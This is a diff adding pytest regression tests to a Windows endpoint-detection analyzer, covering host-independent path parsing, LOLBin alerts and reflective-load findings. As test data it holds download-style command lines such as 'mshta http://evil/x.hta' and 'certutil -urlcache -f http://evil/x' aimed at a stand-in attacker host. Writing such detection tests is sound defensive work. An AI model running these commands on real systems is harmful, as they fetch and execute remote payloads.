@@ -193,6 +193,99 @@ def test_analyze_flags_lolbin_and_suspicious_dll(monkeypatch):
     assert "kernel_image_load" in kinds
 
 
+# ── V69 M61 RC1: the analyzer parses WINDOWS paths on ANY host ──────────────
+# ``os.path.basename`` binds to the host flavour, so on POSIX it returned the
+# whole of ``C:\Windows\System32\mshta.exe`` and no LOLBin ever matched: a silent
+# detection loss on every non-Windows host, including CI.
+def _emitted(monkeypatch):
+    out = []
+    monkeypatch.setattr(kt, "_emit",
+                        lambda kind, sev, attck, extra: out.append((kind, extra)))
+    return out
+
+
+@pytest.mark.parametrize("image,expected", [
+    (r"C:\Windows\System32\mshta.exe",   "mshta.exe"),
+    (r"C:/Windows/System32/mshta.exe",   "mshta.exe"),   # mixed/forward separators
+    (r"\\host\share\certutil.exe",       "certutil.exe"),  # UNC
+    ("mshta.exe",                        "mshta.exe"),   # already bare
+    ("  C:\\Windows\\rundll32.exe  ",    "rundll32.exe"),
+    ("",                                 ""),
+])
+def test_image_basename_is_host_independent(image, expected):
+    assert kt._image_basename(image) == expected
+
+
+def test_lolbin_detection_survives_a_posix_host(monkeypatch):
+    """The regression itself: a Windows LOLBin path must alert on a Linux host."""
+    emitted = _emitted(monkeypatch)
+    kt._analyze({"EventID": 1, "ImageName": r"C:\Windows\System32\mshta.exe",
+                 "CommandLine": "mshta http://evil/x.hta",
+                 "ProcessId": "123", "ParentProcessId": "4"})
+    assert [k for k, _ in emitted] == ["kernel_process_create"]
+    reasons = emitted[0][1]["reasons"]
+    assert any("LOLBin process: mshta.exe" == r for r in reasons)
+
+
+def test_multiple_independent_signals_are_all_preserved(monkeypatch):
+    """A LOLBin running FROM a user-writable path is two findings, not one.
+
+    Classification must not stop at the first match — that would discard the
+    signal that makes the event more suspicious than either half.
+    """
+    emitted = _emitted(monkeypatch)
+    kt._analyze({"EventID": 1,
+                 "ImageName": r"C:\Users\bob\AppData\Local\Temp\certutil.exe",
+                 "CommandLine": "certutil -urlcache -f http://evil/x",
+                 "ProcessId": "7", "ParentProcessId": "4"})
+    assert len(emitted) == 1, "one event must produce exactly one finding"
+    reasons = emitted[0][1]["reasons"]
+    assert any(r.startswith("LOLBin process:") for r in reasons)
+    assert any(r.startswith("process from user-writable path:") for r in reasons)
+    assert len(reasons) == len(set(reasons)), "duplicate reasons emitted"
+    # Deterministic ordering: LOLBin is always reported before the path signal.
+    assert reasons.index(next(r for r in reasons if r.startswith("LOLBin"))) == 0
+
+
+def test_no_reflective_load_finding_is_invented_off_windows(monkeypatch):
+    """``os.path.exists`` cannot observe a Windows filesystem from Linux.
+
+    It answered "absent" for every Windows path, so each image load acquired a
+    fabricated "reflective load indicator" with no observation behind it. The
+    genuine suspicious-path signal must still fire.
+    """
+    monkeypatch.setattr(kt, "_IS_WINDOWS", False)
+    emitted = _emitted(monkeypatch)
+    kt._analyze({"EventID": 5,
+                 "ImageName": r"C:\Users\bob\AppData\Local\Temp\evil.dll",
+                 "ProcessId": "55"})
+    assert [k for k, _ in emitted] == ["kernel_image_load"]
+    reasons = emitted[0][1]["reasons"]
+    assert any("suspicious path" in r for r in reasons)
+    assert not any("reflective load" in r for r in reasons), \
+        "a finding was invented from an observation this host cannot make"
+
+
+def test_a_clean_windows_dll_path_produces_no_finding_off_windows(monkeypatch):
+    """The negative control for the above: no suspicious dir, so no event at all."""
+    monkeypatch.setattr(kt, "_IS_WINDOWS", False)
+    emitted = _emitted(monkeypatch)
+    kt._analyze({"EventID": 5, "ImageName": r"C:\Windows\System32\ntdll.dll",
+                 "ProcessId": "55"})
+    assert emitted == []
+
+
+def test_reflective_load_indicator_still_works_on_windows(monkeypatch):
+    """Existing kernel_image_load behaviour is preserved where it is evidence."""
+    monkeypatch.setattr(kt, "_IS_WINDOWS", True)
+    monkeypatch.setattr(kt.os.path, "exists", lambda _p: False)
+    emitted = _emitted(monkeypatch)
+    kt._analyze({"EventID": 5, "ImageName": r"C:\Windows\System32\phantom.dll",
+                 "ProcessId": "55"})
+    assert [k for k, _ in emitted] == ["kernel_image_load"]
+    assert any("reflective load" in r for r in emitted[0][1]["reasons"])
+
+
 def test_analyze_ignores_benign_process(monkeypatch):
     emitted = []
     monkeypatch.setattr(kt, "_emit",
